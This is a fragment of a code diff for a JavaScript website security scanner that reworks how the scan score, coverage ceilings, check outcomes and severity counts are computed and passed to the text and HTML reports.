     await executeStep('tls', (spinner) => auditTls(baseUrl, spinner));
   }
 
-  if (modules.includes('stack')) {
-    await executeStep('stack', (spinner) => detectStack(baseUrl, jsContents, spinner));
-  }
 
-  const score = calculateScanScore(context.findings);
   const scanMetrics = metrics.finish();
   scanMetrics.network = httpClient.metrics();
+  scanMetrics.checks = context.auditChecks || {};
   scanMetrics.browser = { ...context.browserMetrics };
   scanMetrics.scope = context.scope.metrics();
   const limitations = [];
@@ -4578,6 +3816,7 @@ async function runScanInternal(config, httpClient, context) {
   if (modules.includes('supabase') && supabaseAudit?.inventoryComplete === false) limitations.push('supabase_schema_inventory_unavailable');
   if (modules.includes('ai-rag') && aiRagAudit?.limitations?.length) limitations.push(...aiRagAudit.limitations);
   const coverage = summarizeCoverage(modules, scanMetrics.steps, { limitations });
+  const score = calculateScanScore(context.findings, { coverageStatus: coverage.status });
   const supabaseOnly = modules.length === 1 && modules[0] === 'supabase';
   const aiRagOnly = modules.length === 1 && modules[0] === 'ai-rag';
   const scoreAvailable = (!supabaseOnly || supabaseAudit?.scoreAvailable === true)
@@ -4593,6 +3832,12 @@ async function runScanInternal(config, httpClient, context) {
     metrics: scanMetrics,
     coverage,
     score_reliable: coverage.status === 'complete',
+    check_outcomes: context.checkOutcomes.slice(0, 100),
+    presentation: scorePresentation(scoreAvailable ? score.score : null, {
+      criticalCount: context.findings.filter(f => ['CRITICAL', 'CRITIQUE'].includes(f.severity)).length,
+      highCount: context.findings.filter(f => ['HIGH', 'ELEVEE'].includes(f.severity)).length,
+      coverageStatus: coverage.status,
+    }),
     engine_version: ENGINE_VERSION,
     ruleset_version: RULESET_VERSION,
     score_breakdown: {
@@ -4600,6 +3845,8 @@ async function runScanInternal(config, httpClient, context) {
       breakdown: score.breakdown,
       excluded: score.excluded,
       min_confidence: score.min_confidence,
+      impact_ceiling: score.impact_ceiling,
+      coverage_ceiling: score.coverage_ceiling,
     },
     completed_at: new Date().toISOString(),
     ai_rag_audit: aiRagAudit,
@@ -4764,7 +4011,7 @@ async function main(options = {}) {
   findings.length = 0;
   findings.push(...result.findings);
   // REPORT
-  printReport();
+  printReport(result);
   if (!result.score_reliable) {
     console.log(chalk.yellow('  Score provisional: some checks were incomplete. See coverage in the JSON report.\n'));
   }
@@ -4785,7 +4032,7 @@ async function main(options = {}) {
       ]);
 
   if (wantHtml) {
-    await exportHtml(baseUrl);
+    await exportHtml(baseUrl, result);
   }
 
   console.log(chalk.hex('#6366f1')('  Webba Creative Technologies') + chalk.gray(' - Scan complete.\n'));
